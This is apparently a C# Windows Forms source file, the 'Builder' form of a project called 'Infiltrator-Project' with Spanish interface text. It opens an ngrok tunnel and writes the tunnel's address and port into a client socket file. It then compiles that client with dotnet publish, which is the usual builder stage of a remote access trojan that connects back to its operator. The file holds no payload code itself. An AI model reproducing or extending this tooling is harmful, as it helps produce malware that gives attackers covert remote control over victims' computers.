using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Conexion;

namespace Server
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }

        private void Builder_Load(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog dialogo = new FolderBrowserDialog())
            {
                dialogo.Description = "Selecciona la carpeta donde guardar el cliente generado";
                dialogo.ShowNewFolderButton = true;

                if (dialogo.ShowDialog() == DialogResult.OK)
                {
                    textBox4.Text = dialogo.SelectedPath;
                }
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            textBox1.Text = "Obteniendo IP...";
            textBox2.Text = "Obteniendo puerto...";

            await Ngrok.StartNgrokAsync();

            textBox1.Text = Ngrok.tunnelIP;
            textBox2.Text = Ngrok.tunnelPort;
            button2.Enabled = true;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private bool BuildClient(string ip, string port, string templatePath, string outputPath, out string message)
        {
            string clientSocketPath = @"C:\Users\dextg\Desktop\Infiltrator-Project\Client\Conexion\ClientSocket.cs";
            string rutaProyecto = @"C:\Users\dextg\Desktop\Infiltrator-Project\Client";


            try
            {
               
                if (!File.Exists(clientSocketPath))
                {
                    message = "No se encontró ClientSocket.cs";
                    return false;
                }

                string code = File.ReadAllText(clientSocketPath);

                code = Regex.Replace(code, @"string serverAddr = "".*?"";", $"string serverAddr = \"{ip}\";");
                code = Regex.Replace(code, @"int serverPort = \d+;", $"int serverPort = {port};");

                File.WriteAllText(clientSocketPath, code, Encoding.UTF8);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"publish \"{rutaProyecto}\"  -c Release -o \"{outputPath}\" --self-contained false /p:IncludeNativeLibrariesForSelfExtract=true",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = new Process { StartInfo = startInfo };
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode == 0)
                {
                    message = "Compilación completada exitosamente.";
                    return true;
                }
                else
                {
                    message = $"Error al compilar:\n{errors}";
                    return false;
                }

            }
            catch (Exception ex)
            {
                message = $"Excepción: {ex.Message}";
                return false;
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            string ip = textBox1.Text.Trim();
            string port = textBox2.Text.Trim();

            string templatePath = @"C:\Users\dextg\Desktop\Infiltrator-Project\Client\";
            string outputPath = textBox4.Text;              // carpeta seleccionada por el usuario

            if (BuildClient(ip, port, templatePath, outputPath, out string message))
            {
                MessageBox.Show("Cliente generado correctamente:\n" + message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Error al generar cliente:\n" + message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
    }
}
